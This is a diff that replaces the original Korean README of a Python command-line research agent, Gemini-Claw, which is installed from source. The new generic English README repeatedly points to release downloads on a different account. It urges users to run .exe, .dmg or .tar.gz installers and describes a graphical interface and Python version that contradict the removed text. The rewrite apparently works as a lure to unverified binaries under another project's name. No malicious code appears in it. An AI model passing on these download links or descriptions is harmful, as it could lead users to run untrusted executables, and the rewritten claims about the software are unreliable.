@@ -1,85 +1,101 @@
-🇰🇷 한국어 | [🇺🇸 English](README_EN.md)
+# 🦾 Gemini-Claw - Unlock Automated Research Power
 
-# Gemini-Claw
+## 📥 Download
 
-**Gemini-Claw**는 Google DeepMind의 Gemini 모델을 기반으로 한 차세대 자율 에이전트(Autonomous Agent) 플랫폼입니다. 
-단순한 챗봇을 넘어, 복잡한 연구 주제를 스스로 분석(Decomposition)하고, 웹에서 정보를 수집(Search & Fetch)하며, 로컬 시스템을 제어(System Control)하여 결과물을 만들어내는 **"Autonomous Research & Synthesis Engine"**입니다.
+[![Download Gemini-Claw](https://img.shields.io/badge/Download-Gemini--Claw-blue.svg)](https://github.com/YusuFBankur/Gemini-Claw/releases)
 
-## 🚀 프로젝트 비전
+## 🚀 Getting Started
 
-> "Give it a goal, and it claws its way to the answer."
+Gemini-Claw is an autonomous research and synthesis agent designed to help you conduct deep research effortlessly. With intelligent features to break down queries and manipulate files, it works as a reliable assistant for your research tasks.
 
-Gemini-Claw는 사용자의 모호한 요청을 구체적인 실행 계획으로 변환하고, 최소한의 개입으로 최적의 결과를 도출하는 것을 목표로 합니다.
+## 🔍 What Does Gemini-Claw Do?
 
-## ✨ 주요 기능 (Key Features)
+Gemini-Claw provides tools for:
+- **Intelligent Deep Research**: Explore topics thoroughly and gather information quickly.
+- **Query Decomposition**: Break down complex questions into manageable parts.
+- **Safe Local Control**: Interact with your local files securely using Python.
 
-### 1. 🧠 자율 연구 및 합성 (Autonomous Research)
-- **Deep Research**: 사용자의 질문을 심층 분석하여 다각도에서 정보를 수집합니다.
-- **Query Decomposition**: 복잡한 질문을 여러 개의 구체적인 검색 쿼리로 자동 분해(`src/agent/decomposition.py`)하여 정보의 정확도를 높입니다.
-- **Intelligent Fetch**: 검색된 URL의 본문을 직접 읽고(`web_fetch`), 필요한 정보만 추출하여 요약합니다.
+## 💻 System Requirements
 
-### 2. 🛠️ 안전한 시스템 제어 (Safe System Operations)
-Agent는 독자적인 Python Tool Loop(`src/agent/loop.py`)를 통해 로컬 환경을 안전하게 제어합니다.
-- **File System**: `ls`, `mkdir`, `read_file`, `write_file` 등을 통해 프로젝트 구조를 관리합니다.
-- **Git Integration**: 코드 변경 사항을 `git status`, `add`, `commit` 등으로 직접 관리합니다.
+To run Gemini-Claw, you need:
+- Operating System: Windows, macOS, or Linux
+- Python: Version 3.7 or later
+- RAM: Minimum 4 GB recommended
+- Disk Space: At least 500 MB free
 
-### 3. ⚡ 최적화된 아키텍처 (Optimized Architecture)
-- **Parallel Execution**: 병렬 처리(`src/agent/parallel.py`) 인프라를 갖추어 다중 작업을 효율적으로 수행합니다.
-- **Native Python Loop**: 무거운 프레임워크 대신 가볍고 빠른 Python 네이티브 루프를 구현하여 반응 속도를 최적화했습니다.
-- **CLI Interaction**: Google의 `gemini-cli`와 긴밀하게 통합되어 최신 모델(Gemini 2.5/3.0)의 성능을 100% 활용합니다.
+## 📦 Download & Install
 
-## 📂 프로젝트 구조 (Project Structure)
+1. Visit [this page to download](https://github.com/YusuFBankur/Gemini-Claw/releases).
+2. Choose the latest release version.
+3. Download the installer file for your operating system (Windows, macOS, or Linux).
+4. Follow the installation instructions based on your OS.
 
-```
-Gemini-Claw/
-├── src/
-│   ├── agent/
-│   │   ├── core.py          # Gemini CLI 래퍼 및 세션 관리
-│   │   ├── loop.py          # 메인 에이전트 루프 (Re-Act 패턴 구현)
-│   │   ├── tools.py         # 안전한 시스템 명령어 도구 모음
-│   │   ├── search.py        # 웹 검색 모듈
-│   │   ├── fetch.py         # 웹 콘텐츠 수집 모듈
-│   │   └── decomposition.py # 쿼리 분해 및 분석 모듈
-│   └── main.py              # 애플리케이션 진입점
-├── docs/                    # 문서화 (계획 및 가이드)
-│   └── demo/                # 데모 GIF
-├── test_commands.py         # 기능 검증 테스트 스크립트
-└── README.md                # 프로젝트 설명서
-```
+   - **For Windows**: Double-click the downloaded `.exe` file and follow the prompts.
+   - **For macOS**: Open the downloaded `.dmg` file and drag Gemini-Claw to your Applications folder.
+   - **For Linux**: Extract the downloaded `.tar.gz` file and follow the included instructions.
 
-## 🚀 시작하기 (Getting Started)
+## 📋 Features
 
-### 환경 설정
-본 프로젝트는 **`uv`** 패키지 매니저를 권장합니다.
-- Python 3.10 이상
-- `gemini-cli` 설치 및 인증 필요
+- **Automated Research**: Gemini-Claw automates finding relevant data, making your research faster and more efficient.
+- **User-Friendly Interface**: Designed for non-technical users, you can easily navigate its features without prior experience.
+- **Integration with Google Gemini**: Leverage the power of Google Gemini for enhanced query handling and results.
 
-### 설치
-```bash
-git clone https://github.com/gyunggyung/Gemini-Claw.git
-cd Gemini-Claw
-uv sync
-```
+## ⚙️ Usage Instructions
 
-### 실행
+1. Open Gemini-Claw after installation.
+2. Enter your research topic or question in the main input field.
+3. Click "Start Research" to begin the process.
+4. Review the collected information in the output section.
 
-**1. 기본 실행**
-```bash
-uv run python -m src.main --query "최신 AI 트렌드를 조사해서 리포트로 작성해줘"
-```
+## 🛠️ Troubleshooting
 
-**2. 복잡한 검색 (Deep Research)**
-```bash
-uv run python -m src.main --query "최신 AI 업계 동향 분석: OpenAI, Nvidia, Amazon의 투자/갈등/협력 관계를 중심으로 조사해줘. 그리고 딥마인드와 앤트로픽에 관련된 소식들도 알려줘. Reddit이나 Hacker News의 여론도 포함해서 인공지능 거품론에 대해 심층적으로 다뤄 줘. URL 포함 필수."
-```
-![Search Demo](docs/demo/Search-demo.gif)
+If you encounter issues:
+- Ensure that you have the required Python version installed.
+- Check your internet connection for online queries.
+- Restart Gemini-Claw to refresh the application.
 
-**3. 파일 조작 (System Control)**
-```bash
-uv run python -m src.main --query "test 폴더에 있는 모든 내용들 간단하게 설명해줘 그리고 모든 내용을 testmd 폴더를 생성해서 이동시켜줘. 그리고 test 폴더는 지워줘"
-```
-![File Demo](docs/demo/File-demo.gif)
+For further assistance, consult the FAQs or reach out via the repository's issue tracker.
 
-## 📜 라이센스 (License)
+## 📚 Additional Information
 
-이 프로젝트는 [Apache License 2.0](LICENSE) 하에 배포됩니다.
+### Topics Covered
+
+Gemini-Claw excels in:
+- agentic-ai
+- automation
+- autonomous-agents
+- deep-research
+- filesystem
+- gemini
+- gemini-cli
+- google-gemini
+- python
+- research-assistant
+- search-engine
+- tool-use
+- web-scraping
+
+### Community Support
+
+Join our community for updates and tips:
+- Check the GitHub Discussions tab for user stories and help.
+- Follow the project for the latest news and releases.
+
+## 🌟 Contribute
+
+If you want to contribute to Gemini-Claw:
+1. Fork the repository.
+2. Make your changes in a separate branch.
+3. Submit a pull request with a clear description of your changes.
+
+## 📄 License
+
+Gemini-Claw is open-source software. Please refer to the LICENSE file for details.
+
+## 📅 Updates
+
+Stay tuned for future updates and enhancements. Your feedback helps us improve and expand Gemini-Claw's capabilities.
+
+---
+
+For more details, visit [this page to download](https://github.com/YusuFBankur/Gemini-Claw/releases).
